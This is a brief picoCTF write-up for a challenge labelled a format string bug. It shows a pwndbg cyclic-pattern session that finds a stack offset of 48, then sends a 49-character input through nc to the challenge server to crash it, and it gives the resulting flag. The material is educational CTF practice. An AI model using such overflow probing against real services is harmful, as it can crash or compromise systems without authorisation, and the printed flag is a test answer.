# format string 0


This is a simple format string vulnerabilty.
We just need to crash the program to obtain the flag..........

let's find the offset.

---

```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/lynk/picoCTF/format-string0/format-string-0 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
There is no such burger yet!

Program received signal SIGSEGV, Segmentation fault.
0x00000000004014c2 in serve_patrick ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
 RAX  0x0
*RBX  0x7fffffffe448 —▸ 0x7fffffffe6a1 ◂— '/home/lynk/picoCTF/format-string0/format-string-0'
*RCX  0x900
 RDX  0x0
*RDI  0x7ffff7f9ea30 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x0
*R8   0x64
*R9   0x7ffff7f9caa0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*R10  0x7ffff7dd2fd0 ◂— 0x100022000065f3
*R11  0x202
 R12  0x0
*R13  0x7fffffffe458 —▸ 0x7fffffffe6d3 ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401240 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616167 ('gaaaaaaa')
*RSP  0x7fffffffe308 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x4014c2 (serve_patrick+263) ◂— ret 
───────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
 ► 0x4014c2 <serve_patrick+263>    ret    <0x6161616161616168>










─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ rsp 0x7fffffffe308 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffe310 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffe318 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018│     0x7fffffffe320 ◂— 'kaaaaaaalaaaaaaamaaa'
04:0020│     0x7fffffffe328 ◂— 'laaaaaaamaaa'
05:0028│     0x7fffffffe330 ◂— 0x6161616d /* 'maaa' */
06:0030│     0x7fffffffe338 —▸ 0x7ffff7df06ca (__libc_start_call_main+122) ◂— mov edi, eax
07:0038│     0x7fffffffe340 —▸ 0x7fffffffe430 —▸ 0x7fffffffe438 —▸ 0x7ffff7fc3160 —▸ 0x7ffff7dc9000 ◂— ...
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0         0x4014c2 serve_patrick+263
   1 0x6161616161616168
   2 0x6161616161616169
   3 0x616161616161616a
   4 0x616161616161616b
   5 0x616161616161616c
   6       0x6161616d
   7   0x7ffff7df06ca __libc_start_call_main+122
───────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l gaaaaaaa
Finding cyclic pattern of 8 bytes: b'gaaaaaaa' (hex: 0x6761616161616161)
Found at offset 48
pwndbg>
```
---

offset is 48 but we need exactly 49 characters to crash the program.

```bash
❯ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc mimas.picoctf.net 53460

Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

---

